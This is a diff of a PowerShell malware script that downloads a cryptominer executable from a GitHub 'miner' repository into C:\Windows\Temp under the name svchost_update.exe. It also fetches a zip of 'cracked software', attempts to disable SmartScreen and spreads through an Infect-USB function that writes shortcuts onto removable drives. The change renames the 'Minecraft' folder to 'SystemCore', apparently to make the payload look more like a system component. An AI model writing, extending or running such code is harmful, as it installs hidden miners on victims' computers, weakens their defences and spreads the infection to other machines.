@@ -23,10 +23,10 @@ if (Is-Admin) {
 
 $payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
 $payloadPath = "C:\Windows\Temp\svchost_update.exe"
-$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/Minecraft.zip"
+$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
 $crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
 $crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
-$crackedSoftwareExe = "$crackedSoftwareFolder\Minecraft\ServiceHost.exe"
+$crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"
 
 Add-Content -Path $logPath -Value "Attempting to disable SmartScreen..."
 try {
@@ -194,7 +194,7 @@ if (-not (Test-Path -Path $crackedSoftwareFolder)) {
             throw "Extraction failed."
         }
         if (-not (Test-Path -Path $crackedSoftwareExe)) {
-            Add-Content -Path $logPath -Value "Warning: ServiceHost.exe not found in $crackedSoftwareFolder\Minecraft."
+            Add-Content -Path $logPath -Value "Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
             throw "Update executable missing."
         }
         try {
@@ -209,9 +209,9 @@ if (-not (Test-Path -Path $crackedSoftwareFolder)) {
 } else {
     Add-Content -Path $logPath -Value "WindowsServices folder already exists at $crackedSoftwareFolder."
     if (-not (Test-Path -Path $crackedSoftwareExe)) {
-        Add-Content -Path $logPath -Value "Warning: ServiceHost.exe not found in $crackedSoftwareFolder\Minecraft."
+        Add-Content -Path $logPath -Value "Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
     } else {
-        Add-Content -Path $logPath -Value "Confirmed: ServiceHost.exe exists in $crackedSoftwareFolder\Minecraft."
+        Add-Content -Path $logPath -Value "Confirmed: ServiceHost.exe exists in $crackedSoftwareFolder\SystemCore."
     }
 }
 
@@ -299,11 +299,11 @@ function Infect-USB {
         }
         $shell = New-Object -ComObject WScript.Shell
         $shortcut = $shell.CreateShortcut($lnkPath)
-        $shortcut.TargetPath = "$usbSoftwareFolder\Minecraft\ServiceHost.exe"
+        $shortcut.TargetPath = "$usbSoftwareFolder\SystemCore\ServiceHost.exe"
         $shortcut.IconLocation = "%SystemRoot%\system32\imageres.dll,2"
-        $shortcut.WorkingDirectory = "$usbSoftwareFolder\Minecraft"
+        $shortcut.WorkingDirectory = "$usbSoftwareFolder\SystemCore"
         $shortcut.Save()
-        Add-Content -Path $logPath -Value "Created shortcut at $lnkPath pointing to $usbSoftwareFolder\Minecraft\ServiceHost.exe"
+        Add-Content -Path $logPath -Value "Created shortcut at $lnkPath pointing to $usbSoftwareFolder\SystemCore\ServiceHost.exe"
     } catch {
         Add-Content -Path $logPath -Value "Failed to process USB at $usbPath. Error: $_"
     }
